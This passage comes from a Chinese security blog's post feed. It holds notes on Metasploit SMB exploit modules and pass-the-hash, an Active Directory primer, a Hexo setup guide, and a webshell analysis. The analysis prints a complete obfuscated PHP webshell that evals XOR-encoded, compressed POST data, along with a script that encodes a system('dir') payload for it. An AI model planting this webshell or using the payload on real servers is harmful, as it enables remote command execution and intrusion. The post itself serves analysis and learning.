exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec 模块，你需要先确保目标系统存在 MS17-010 漏洞。这通常通过使用 auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010 辅助模块进行扫描来确认。一旦确认目标系统存在漏洞，你可以设置攻击模块的参数，如目标主机的 IP 地址（RHOST）、要执行的 PowerShell 命令等。</p><h5 id="exploit-windows-smb-smb-doublepulsar-rce"><a href="#exploit-windows-smb-smb-doublepulsar-rce" class="headerlink" title="exploit&#x2F;windows&#x2F;smb&#x2F;smb_doublepulsar_rce"></a>exploit&#x2F;windows&#x2F;smb&#x2F;smb_doublepulsar_rce</h5><p>exploit&#x2F;windows&#x2F;smb&#x2F;smb_doublepulsar_rce 是 Metasploit Framework 中的一个攻击模块，它利用了所谓的 “DoublePulsar” 漏洞。这个漏洞是在 Windows 的 Server Message Block (SMB) 实现中发现的，允许远程攻击者执行任意代码。</p><p>DoublePulsar 漏洞最初是在 2017 年被公开的，它与 EternalBlue 漏洞（MS17-010）类似，但它是针对不同的 SMB 版本和配置。由于 DoublePulsar 漏洞的存在，攻击者可以在目标系统上植入恶意软件，实现持久化控制，并收集敏感信息或执行其他恶意操作。</p><p>要使用 exploit&#x2F;windows&#x2F;smb&#x2F;smb_doublepulsar_rce 模块，你需要确保目标系统存在 DoublePulsar 漏洞。这通常涉及到对目标系统的详细侦查和分析，以确定其是否容易受到该漏洞的攻击。</p><p>一旦确认目标系统存在漏洞，你可以设置攻击模块的相关参数，如目标主机的 IP 地址（RHOST）、端口号（如果适用）、有效载荷（payload）等。有效载荷是在成功利用漏洞后要在目标系统上执行的代码或命令</p><h5 id="exploit-windows-smb-psexec"><a href="#exploit-windows-smb-psexec" class="headerlink" title="exploit&#x2F;windows&#x2F;smb&#x2F;psexec"></a>exploit&#x2F;windows&#x2F;smb&#x2F;psexec</h5><p>这不是工具psexec的问题 而是根据 smb和它叠加起来的效应 只要可以smb通信就有可能执行命令</p><p>exploit&#x2F;windows&#x2F;smb&#x2F;psexec 是 Metasploit Framework（MSF）中的一个模块，用于利用 Windows 系统上的 Server Message Block (SMB) 服务进行远程代码执行。这个模块特别针对 Microsoft Windows 系统上的 psexec 工具，该工具允许用户以其他用户的身份在远程系统上执行命令。</p><p>psexec 是一个合法的、由 Microsoft 提供的工具，它通常用于管理目的，允许管理员以其他用户身份在远程或本地系统上执行程序。然而，如果攻击者能够利用某些漏洞或配置不当来执行恶意 psexec 命令，他们就可能获得对目标系统的完全控制。</p><p>在 MSF 的 exploit&#x2F;windows&#x2F;smb&#x2F;psexec 模块中，攻击者会尝试利用目标系统上 SMB 服务的漏洞，以执行恶意 psexec 命令。这个模块会发送一个特殊构造的网络请求，以触发目标系统上的漏洞，并尝试执行恶意代码或命令。</p><p>要成功利用这个模块，攻击者需要满足以下条件：</p><ol><li>目标系统必须运行着一个易受攻击的 SMB 服务版本。</li><li>攻击者必须能够与目标系统的 SMB 服务建立连接。</li><li>攻击者需要拥有适当的权限来执行恶意 psexec 命令。</li></ol><h4 id="7-软件"><a href="#7-软件" class="headerlink" title="7. 软件"></a>7. 软件</h4><h5 id="samba"><a href="#samba" class="headerlink" title="samba"></a>samba</h5><p>Samba是一个开源软件套件，它允许UNIX和Linux系统上的计算机与Windows操作系统上的计算机进行文件和打印机共享。通过Samba，你可以将UNIX或Linux系统上的文件和打印机共享给Windows客户端，实现跨平台的文件共享和打印服务。<br>Samba提供了一种基于SMB&#x2F;CIFS协议的服务，这是Windows操作系统所使用的文件共享协议。它允许Windows客户端通过网络访问UNIX或Linux系统上的共享文件和打印机，就像它们在Windows网络中的本地资源一样。</p><p>除了文件共享和打印服务外，Samba还支持许多其他功能，如身份验证和授权（通过整合到现有的LDAP或Active Directory环境）、目录服务（通过LDAP）、文件和打印机管理等。</p><p>总的来说，Samba是一个强大的工具，使得UNIX和Linux系统可以与Windows系统无缝集成，为用户提供了便利的文件共享和打印服务。</p><h4 id="8-psexec-命令执行"><a href="#8-psexec-命令执行" class="headerlink" title="8. psexec 命令执行"></a>8. psexec 命令执行</h4><p>这基本上只会在内网看见，因为需要admin$ 的验证，一般都是利用内网的管理员的hash进行pth攻击。</p><p>[[凭据横向#2. Psexec 执行程序]]</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域整理-基础</title>
      <link href="/2025/01/27/%E5%9F%9F%E6%95%B4%E7%90%86-%E5%9F%BA%E7%A1%80/"/>
      <url>/2025/01/27/%E5%9F%9F%E6%95%B4%E7%90%86-%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h4 id="1-什么是域"><a href="#1-什么是域" class="headerlink" title="1. 什么是域"></a>1. 什么是域</h4><p>Microsoft 的Active Directory 是企业界的支柱。它简化了企业环境中设备和用户的管理</p><p>想象一下您正在管理一个只有五台计算机和五名员工的小型企业网络。在如此小的网络中，您可能能够毫无问题地单独配置每台计算机。您将手动登录每台计算机，为使用它们的人员创建用户，并为每个员工的帐户进行特定配置。如果用户的计算机停止工作，您可能会去他们的地方并现场修复计算机。虽然这听起来像是一种非常轻松的生活方式，但让我们假设您的业务突然增长，现在拥有 157 台计算机和分布在四个不同办公室的 320 名不同用户。您是否仍然能够将每台计算机作为单独的实体进行管理，为网络上的每个用户手动配置策略并为每个人提供现场支持？答案很可能是否定的。</p><blockquote><p>so? 针对多个计算机我们该怎么办呢?<br>为了克服这些限制，我们可以使用 Windows 域。简而言之，Windows 域是给定企业管理下的一组用户和计算机。域背后的主要思想是将 Windows 计算机网络的常见组件的管理集中到称为 Active Directory (AD) 的单个存储库中。运行 Active Directory 服务的服务器称为域控制器 (DC)</p></blockquote><h5 id="1-1-优点"><a href="#1-1-优点" class="headerlink" title="1.1 优点:"></a>1.1 优点:</h5><p>配置 Windows 域的主要优点是：</p><ul><li><strong>Centralised identity management:</strong> All users across the network can be configured from Active Directory with minimum effort.<br>  集中身份管理：网络上的所有用户都可以轻松地从 Active Directory 进行配置。</li><li><strong>Managing security policies:</strong> You can configure security policies directly from Active Directory and apply them to users and computers across the network as needed.<br>  管理安全策略：您可以直接从 Active Directory 配置安全策略，并根据需要将它们应用到网络上的用户和计算机。</li></ul><h5 id="1-2-使用"><a href="#1-2-使用" class="headerlink" title="1.2 使用"></a>1.2 使用</h5><p>在学校&#x2F;大学网络中，您通常会获得一个用户名和密码，您可以在校园内的任何计算机上使用它们。您的凭据对所有计算机都有效，因为每当您在计算机上输入它们时，它都会将身份验证过程转发回 Active Directory，并在其中检查您的凭据。借助 Active Directory，您的凭据无需存在于每台计算机中，并且可以在整个网络中使用。权限控制:***Active Directory 也是允许您的学校&#x2F;大学限制您访问学校&#x2F;大学计算机上的控制面板的组件。策略通常会部署在整个网络中，以便您对这些计算机没有管理权限</p><h4 id="2-组成"><a href="#2-组成" class="headerlink" title="2. 组成"></a>2. 组成</h4><p>任何 Windows 域的核心都是 Active Directory 域服务 (AD DS)。该服务充当目录，保存网络上存在的所有“对象”的信息。在AD支持的众多对象中，有用户、组、机器、打印机、共享等等。让我们看看其中的一些：</p><h5 id="2-1-用户"><a href="#2-1-用户" class="headerlink" title="2.1 用户"></a>2.1 用户</h5><p>用户是 Active Directory 中最常见的对象类型之一。用户是被称为安全主体的对象之一，这意味着他们可以通过域进行身份验证，并且可以被分配对文件或打印机等资源的权限。您可以说安全主体是一个可以对网络中的资源进行操作的对象。</p><p>**用户可以用来表示两种类型的实体：</p><ul><li>  人员：用户通常代表组织中需要访问网络的人员，例如员工。</li><li>  服务：您还可以定义供 IIS 或 MSSQL 等服务使用的用户。每个服务都需要用户来运行，但服务用户与普通用户不同，因为他们只拥有运行特定服务所需的权限。</li></ul><h5 id="2-2-Machines-机器"><a href="#2-2-Machines-机器" class="headerlink" title="2.2 Machines 机器"></a>2.2 Machines 机器</h5><p>机器是 Active Directory 中的另一种对象；对于加入 Active Directory 域的每台计算机，都会创建一个计算机对象。计算机也被视为“安全主体”，并像任何普通用户一样被分配一个帐户。该帐户在域本身内的权限有些有限。<br>计算机帐户本身是指定计算机上的本地管理员，除了计算机本身之外，通常不应该由任何人访问它们，但与任何其他帐户一样，如果您有密码，则可以使用它来登录。<br>注意：机器帐户密码会自动轮换，通常由 120 个随机字符组成。<br>识别机器帐户相对容易。它们遵循特定的命名方案。计算机帐户名称是计算机名称后跟美元符号。例如，名为 <code>DC01</code> 的计算机将有一个名为 <code>DC01$</code> 的计算机帐户。</p><h5 id="2-3-Security-Groups-安全组"><a href="#2-3-Security-Groups-安全组" class="headerlink" title="2.3 Security Groups 安全组"></a>2.3 Security Groups 安全组</h5><p>如果您熟悉 Windows，您可能知道可以定义用户组，将文件或其他资源的访问权限分配给整个组而不是单个用户。这可以实现更好的可管理性，因为您可以将用户添加到现有组，并且他们将自动继承该组的所有权限。安全组也被视为安全主体，因此可以对网络上的资源拥有特权。<br>组可以同时包含用户和计算机作为成员。如果需要，组也可以包括其他组。<br>默认情况下，域中会创建多个组，可用于向用户授予特定权限。</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>Security Group 安全组</strong></td><td><strong>Description 描述</strong></td></tr><tr><td>Domain Admins 域管理员</td><td><br>该组的用户拥有整个域的管理权限。默认情况下，他们可以管理域中的任何计算机，包括 DC。</td></tr><tr><td>Server Operators 服务器运营商</td><td><br>该组中的用户可以管理域控制器。他们无法更改任何管理组成员身份。</td></tr><tr><td>Backup Operators 备份操作员</td><td><br>该组中的用户可以访问任何文件，但忽略其权限。它们用于在计算机上执行数据备份。</td></tr><tr><td>Account Operators 账户运营商</td><td><br>该组中的用户可以创建或修改域中的其他帐户。</td></tr><tr><td>Domain Users域用户</td><td><br>包括域中所有现有的用户帐户。</td></tr><tr><td>Domain Computers 域计算机</td><td><br>包括域中的所有现有计算机。</td></tr><tr><td>Domain Controllers 域控制器</td><td><br>包括域中所有现有的 DC。</td></tr></tbody></table><p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups">组的配置</a></p><h6 id="2-3-1-Domain-Admins-域管理员"><a href="#2-3-1-Domain-Admins-域管理员" class="headerlink" title="2.3.1 Domain Admins 域管理员"></a>2.3.1 Domain Admins 域管理员</h6><ol><li><p><strong>域级权限</strong>：</p><ul><li>作为 <strong>Domain Admins</strong> 组成员，<strong>Administrator</strong> 用户可以对整个域中的所有计算机和用户进行管理。</li><li>该用户可以创建、删除、修改域中的用户账户，管理组成员资格，修改权限，管理域内的所有资源（如文件夹共享和打印机），以及执行其他许多管理任务。</li></ul></li><li><p><strong>可以完全控制域控制器</strong>：</p><ul><li>作为域管理员，<strong>Administrator</strong> 用户可以访问、配置、和管理所有的 <strong>域控制器（Domain Controllers）</strong>。</li><li>这意味着他可以更改域控制器的设置，查看所有用户的账户信息，甚至重置其他管理员账户的密码。</li></ul></li><li><p><strong>权限覆盖本地计算机权限</strong>：</p><ul><li>由于 <strong>Administrator</strong> 是域管理员，<strong>Administrator</strong> 也可以通过域管理员的权限在域内的每台计算机上执行操作。</li><li>例如，他可以通过远程桌面、组策略、远程管理等方式，在域中的任何计算机上执行操作，无论计算机本身是加入域的本地管理员账户还是其它角色。</li></ul></li></ol><h4 id="3-组和服务"><a href="#3-组和服务" class="headerlink" title="3. 组和服务"></a>3. 组和服务</h4><h5 id="3-1-用户与组的关系"><a href="#3-1-用户与组的关系" class="headerlink" title="3.1  用户与组的关系"></a>3.1  <strong>用户与组的关系</strong></h5><p>在 Active Directory（AD）中，用户通常会被添加到一个或多个 <strong>组</strong> 中。组用于管理对资源的访问权限。组本质上是一些用户的集合，能够集中控制哪些用户可以访问特定的资源或服务。</p><ul><li><strong>组的类型</strong>：<ul><li><strong>安全组</strong>（Security Group）：用于控制访问权限。通过将用户添加到安全组中，可以将访问权限授予整个组，这样所有组成员都能访问该组所授权的资源。</li><li><strong>分发组</strong>（Distribution Group）：用于邮件列表等非安全目的，不涉及权限控制。</li></ul></li></ul><h5 id="3-2-如何控制资源访问"><a href="#3-2-如何控制资源访问" class="headerlink" title="3.2 如何控制资源访问"></a>3.2 <strong>如何控制资源访问</strong></h5><ul><li>在 AD 中，资源（如文件、文件夹、应用程序、网络共享等）通常会设置访问控制列表（ACLs），这些 ACLs 定义了哪些用户或组可以访问特定的资源。</li><li>例如，一个文件夹的权限可能设置为只允许 <code>HR-Group</code>（人力资源组）中的成员读取文件，而其他用户无法访问。</li></ul><p>通过将用户加入到 <strong>安全组</strong>，管理员能够灵活地管理访问控制。比如：</p><ul><li><strong>HR 用户组</strong>（HR-Group）可能包含所有人力资源部门的员工。</li><li><strong>Finance 用户组</strong>（Finance-Group）可能包含所有财务部门的员工。</li><li>通过将资源权限分配给这些组，可以简单地控制谁有权访问特定的资源。</li></ul><h5 id="3-3-身份验证过程"><a href="#3-3-身份验证过程" class="headerlink" title="3.3  身份验证过程"></a>3.3  <strong>身份验证过程</strong></h5><p>当用户尝试访问某个受保护的资源时，通常会发生以下过程：</p><ol><li><p><strong>身份验证</strong>：用户在访问资源时需要提供 <strong>凭证</strong>（如用户名和密码）。AD 会对这些凭证进行验证，确认用户是否是有效用户。</p><ul><li>这通常发生在 <strong>域控制器（DC）</strong> 上，域控制器会查验用户凭证是否正确，验证用户的身份。</li></ul></li><li><p><strong>授权</strong>：身份验证通过后，AD 会根据用户所属的 <strong>组</strong> 来决定是否授予访问权限。具体来说，AD 会检查用户所在的安全组，并查看资源的 <strong>访问控制列表（ACL）</strong>，确定哪些组被授权访问该资源。</p><ul><li>例如，若某文件夹的 ACL 中允许 <code>HR-Group</code> 组的成员读取该文件夹，而当前用户属于 <code>HR-Group</code>，则该用户可以访问该文件夹；如果用户不在该组中，则无法访问。</li></ul></li></ol><h5 id="3-4-访问服务的过程"><a href="#3-4-访问服务的过程" class="headerlink" title="3.4 访问服务的过程"></a>3.4 <strong>访问服务的过程</strong></h5><p>在用户请求访问某个服务时，通常会经历以下步骤：</p><ol><li><p><strong>用户登录</strong>：用户首先登录到域（通过输入用户名和密码），这时 AD 会验证用户的身份，确保用户名和密码正确。</p></li><li><p><strong>身份验证</strong>：当用户登录时，域控制器会检查他们的凭证并验证用户的身份。这个过程包括：</p><ul><li>检查用户名是否存在。</li><li>验证密码是否正确。</li><li>验证用户是否有足够的权限进行当前操作（例如是否在正确的组中）。</li></ul></li><li><p><strong>获取组信息</strong>：在用户登录时，域控制器会返回用户所属的所有组信息。这些组决定了用户可以访问哪些资源。例如：</p><ul><li>用户登录时，AD 会向客户端返回该用户所属的所有安全组，这些组信息将用于后续的授权过程。</li></ul></li><li><p><strong>授权访问</strong>：根据用户所属的组，系统会检查用户是否被授权访问特定的资源。例如，若一个文件夹的访问权限仅限于 <code>HR-Group</code>，那么只有属于该组的用户才能访问文件夹。如果用户没有访问权限，系统会拒绝访问。</p></li></ol><h5 id="3-5-示例："><a href="#3-5-示例：" class="headerlink" title="3.5 示例："></a>3.5 <strong>示例：</strong></h5><p>假设你有一个文件夹 <code>\\server\hrdocs</code>，并且你希望只有人力资源部门的成员可以访问它：</p><ul><li>创建一个安全组：<code>HR-Group</code>。</li><li>将所有人力资源部门的成员添加到 <code>HR-Group</code> 中。</li><li>在文件夹 <code>\\server\hrdocs</code> 上设置 ACL，允许 <code>HR-Group</code> 组的成员具有读取权限。</li><li>当 <code>HR-Group</code> 组的成员登录并尝试访问该文件夹时，AD 会验证其身份，并通过查看组信息（即他们属于 <code>HR-Group</code>）来决定是否允许访问。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo博客搭建</title>
      <link href="/2025/01/23/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
      <url>/2025/01/23/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h4 id="1-环境下载"><a href="#1-环境下载" class="headerlink" title="1. 环境下载"></a>1. 环境下载</h4><p><a href="https://blog.csdn.net/yaorongke/article/details/119089190">https://blog.csdn.net/yaorongke/article/details/119089190</a></p><h4 id="2-初始化本地仓库"><a href="#2-初始化本地仓库" class="headerlink" title="2. 初始化本地仓库"></a>2. 初始化本地仓库</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo init </span><br><span class="line"></span><br><span class="line">rm -rf node_modules package-lock.json</span><br><span class="line"></span><br><span class="line">npm install --force</span><br></pre></td></tr></table></figure><p>此时已经安装好了hexo，并且初始化完毕。</p><h4 id="3-相关命令"><a href="#3-相关命令" class="headerlink" title="3. 相关命令"></a>3. 相关命令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hexo cl 删除</span><br><span class="line"></span><br><span class="line">hexo g 生成</span><br><span class="line"></span><br><span class="line">hexo s 本地搭建</span><br><span class="line"></span><br><span class="line">hexo d 自动部署</span><br></pre></td></tr></table></figure><h4 id="4-更换主题"><a href="#4-更换主题" class="headerlink" title="4. 更换主题"></a>4. 更换主题</h4><p>下载 主体到theme文件夹下，设置主config 更换主题 </p><p>接下来如果想要真的自己喜欢的界面，那么就需要知道你选择的主题的架构。一般来讲hexo的主config文件只是一个大概的框架，但是主题的config才是可以diy的地方。</p><h4 id="5-上传"><a href="#5-上传" class="headerlink" title="5. 上传"></a>5. 上传</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先安装依赖</span> </span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line"></span><br><span class="line">hexo -d</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常娱乐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常娱乐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一次混淆webshell分析</title>
      <link href="/2025/01/19/%E4%B8%80%E6%AC%A1%E6%B7%B7%E6%B7%86webshell%E5%88%86%E6%9E%90/"/>
      <url>/2025/01/19/%E4%B8%80%E6%AC%A1%E6%B7%B7%E6%B7%86webshell%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h4 id="1-webshell-混淆"><a href="#1-webshell-混淆" class="headerlink" title="1. webshell 混淆"></a>1. webshell 混淆</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$k</span>=<span class="string">&quot;161ebd7d&quot;</span>;<span class="variable">$kh</span>=<span class="string">&quot;45089b3446ee&quot;</span>;<span class="variable">$kf</span>=<span class="string">&quot;4e0d86dbcf92&quot;</span>;<span class="variable">$p</span>=<span class="string">&quot;lFDu8RwONqmag5ex&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line"><span class="comment"># $t 是base64解码后的内容 </span></span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>);<span class="variable">$l</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>);<span class="variable">$o</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$l</span>;)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;(<span class="variable">$j</span>&lt;<span class="variable">$c</span>&amp;&amp;<span class="variable">$i</span>&lt;<span class="variable">$l</span>);<span class="variable">$j</span>++,<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$o</span>.=<span class="variable">$t</span>[<span class="variable">$i</span>]^<span class="variable">$k</span>[<span class="variable">$j</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">循环的大致意思是我们采用 无论是输入的$t,还是自定义的$k。无论谁比谁长还是短。用户输入的$t必须要遍历完，如果$k不够那就从头开始。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/<span class="subst">$kh</span>(.+)<span class="subst">$kf</span>/&quot;</span>,@<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>),<span class="variable">$m</span>)==<span class="number">1</span>) &#123;</span><br><span class="line">@<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ob_start(): 该函数开启输出缓冲。默认情况下，PHP 会将所有输出直接发送到浏览器。但当开启输出缓冲后，PHP 会将输出存储在内存中，而不是立刻发送到浏览器。只有在缓冲区被清空或者脚本执行结束时，输出才会被发送给浏览器。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">@<span class="keyword">eval</span>(@<span class="title function_ invoke__">gzuncompress</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$m</span>[<span class="number">1</span>]),<span class="variable">$k</span>)));</span><br><span class="line"><span class="comment"># gzuncompress 是一种解压缩函数 </span></span><br><span class="line"><span class="variable">$o</span>=@<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">@<span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line"><span class="variable">$r</span>=@<span class="title function_ invoke__">base64_encode</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">gzcompress</span>(<span class="variable">$o</span>),<span class="variable">$k</span>));</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;<span class="subst">$p</span><span class="subst">$kh</span><span class="subst">$r</span><span class="subst">$kf</span>&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>唯一一个无法确定的就是preg_match中的$m变量。一般来讲，这就是保存捕获的字符串。</p><ul><li><code>$m</code> 是一个数组变量，用来存储正则表达式的匹配结果。如果匹配成功，<code>preg_match</code> 会将匹配的结果存入 <code>$m</code> 中， <code>$m[0]</code> 会包含完整匹配的内容，而 <code>$m[1]</code> 会包含第一个捕获组（即 <code>(.+)</code> 匹配的内容）。</li></ul><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250119142523.png" alt="image.png"></p><h4 id="2-分析"><a href="#2-分析" class="headerlink" title="2. 分析"></a>2. 分析</h4><p>经过针对混淆的代码进行分析，首先利用input伪协议，将数据post方式传递上来。同时利用异或函数生成payload。   @eval (@gzuncompress(@x(@base64_decode($m[1]), $k))); 但是注意给的payload都是压缩过的。因此在异或完毕后需要解压。同时针对于输出其实就看出来了，开始给的数据是如何压缩加密的。</p><h4 id="3-利用"><a href="#3-利用" class="headerlink" title="3. 利用"></a>3. 利用</h4><p>由此我们可以看到我们只需要在post数据中传递对应的数据，只要让他正则匹配到就可以。主要是我们的数据一定要严格按照输出格式进行输入。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$r</span>=@<span class="title function_ invoke__">base64_encode</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">gzcompress</span>(<span class="variable">$o</span>),<span class="variable">$k</span>));</span><br></pre></td></tr></table></figure><h5 id="3-1-测试-payload"><a href="#3-1-测试-payload" class="headerlink" title="3.1 测试 payload"></a>3.1 测试 payload</h5><p>system(‘dir’);</p><p><code>加密.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$k</span> = <span class="string">&quot;161ebd7d&quot;</span>;</span><br><span class="line"><span class="variable">$kh</span> = <span class="string">&quot;45089b3446ee&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;4e0d86dbcf92&quot;</span>;</span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;lFDu8RwONqmag5ex&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment"># $t 是base64解码后的内容 </span></span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$l</span>; ) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; (<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>); <span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$o</span> .= <span class="variable">$t</span>[<span class="variable">$i</span>] ^ <span class="variable">$k</span>[<span class="variable">$j</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       循环的大致意思是我们采用 无论是输入的$t,还是自定义的$k。无论谁比谁长还是短。用户输入的$t必须要遍历完，如果$k不够那就从头开始。</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># echo @gzuncompress(@x(@base64_decode($_POST[&#x27;r&#x27;]), $k));</span></span><br><span class="line"><span class="variable">$o</span> = <span class="string">&quot;system(&#x27;dir&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$r</span> = @<span class="title function_ invoke__">base64_encode</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">gzcompress</span>(<span class="variable">$o</span>), <span class="variable">$k</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$r</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Saoay05KfqnkZn6sTjbg0Dc2GUFm2w==</span><br><span class="line"></span><br><span class="line"><span class="number">45089</span>b3446ee</span><br><span class="line"></span><br><span class="line"><span class="number">4e0</span>d86dbcf92</span><br><span class="line"></span><br><span class="line"><span class="number">45089</span>b3446eeSaoay05KfqnkZn6sTjbg0Dc2GUFm2w==<span class="number">4e0</span>d86dbcf92</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>解密.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span 